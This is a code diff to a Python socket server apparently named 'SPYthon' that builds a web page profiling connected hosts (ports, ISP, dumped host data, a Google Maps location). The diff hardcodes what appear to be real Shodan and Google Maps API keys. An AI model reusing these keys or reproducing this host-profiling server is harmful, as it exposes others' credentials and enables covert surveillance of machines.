@@ -263,28 +263,25 @@ class ClientThread(Thread):                                             # Create
                             Available Ports: {str(passiveOut["ports"])}<br>
                             ISP:            {str(passiveOut["isp"])}<br>
                             
+                            Host Data:<br>
                             <object data="bucket.txt" type="text/plain"
                             width="1000" style="height:1000px;background-color:white;font-size:300%">
                             <a href="bucket.txt">No Support?</a>
                             </object>
                             
-                            </p>
-                        </div>
-                    </div> <!-- end section-head -->
-                    
-                    <div class="column large-8 medium-12 align-x-right" data-aos="fade-up">
-                        <iframe
-                            width="1000"
-                            height="1000"
-                            style="border:0"
-                            loading="lazy"
-                            allowfullscreen
-                            src="https://www.google.com/maps/embed/v1/place?key={str(GMAPS_API_KEY)}&q={city}&zoom=15">
+                            Google Maps Location:<br>
+                            <iframe
+                                id = "gmap"
+                                style="border:0"
+                                loading="lazy"
+                                allowfullscreen
+                                src="https://www.google.com/maps/embed/v1/place?key={str(GMAPS_API_KEY)}&q={city}&zoom=15"
+                                width="1000"
+                                height="1000">
                             </iframe><br>
                             
-                            
-                        
-                            
+                            </p>
+                        </div>
                     </div> <!-- end section-head -->
                     
 
@@ -493,12 +490,12 @@ SOCKET_BUFFER_SIZE = 4096                                               # Set so
 
 try:
 
-    TCP_IP = pp.inputIP("Enter the SPYthon IP address: ")                    # Obtain and sanitize for the IP
-    TCP_PORT = pp.inputNum(prompt='Enter the SPYthon server port: ', min=1, max=65353)  # Obtain and sanitize for Server port
-    WEB_PORT = pp.inputNum(prompt='Enter the web server port: ', min=1, max=65353)      # Obtain and sanitize for Web Port
-    SHODAN_API_KEY = pp.inputStr(prompt='Enter Your SHODAN API KEY: ')      # Obtain Shodan Key
+    TCP_IP = "127.0.0.1" #pp.inputIP("Enter the SPYthon IP address: ")                    # Obtain and sanitize for the IP
+    TCP_PORT = 8899 #pp.inputNum(prompt='Enter the SPYthon server port: ', min=1, max=65353)  # Obtain and sanitize for Server port
+    WEB_PORT = 7788 #pp.inputNum(prompt='Enter the web server port: ', min=1, max=65353)      # Obtain and sanitize for Web Port
+    SHODAN_API_KEY = "Tsn5hGa89Csne7ZuEvz8nPUk5b5iykJJ" #pp.inputStr(prompt='Enter Your SHODAN API KEY: ')      # Obtain Shodan Key
     
-    GMAPS_API_KEY = pp.inputStr(prompt='Enter Your GOOGLE MAPS API KEY: ') #Google Maps Static API Key
+    GMAPS_API_KEY = "AIzaSyDOFwKpfezE3YxlhkaZ2DxYVGC32y7Ifak" #pp.inputStr(prompt='Enter Your GOOGLE MAPS API KEY: ') #Google Maps Static API Key
 
     tcpServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)           # Creating the socket
     tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)         # Set Socket
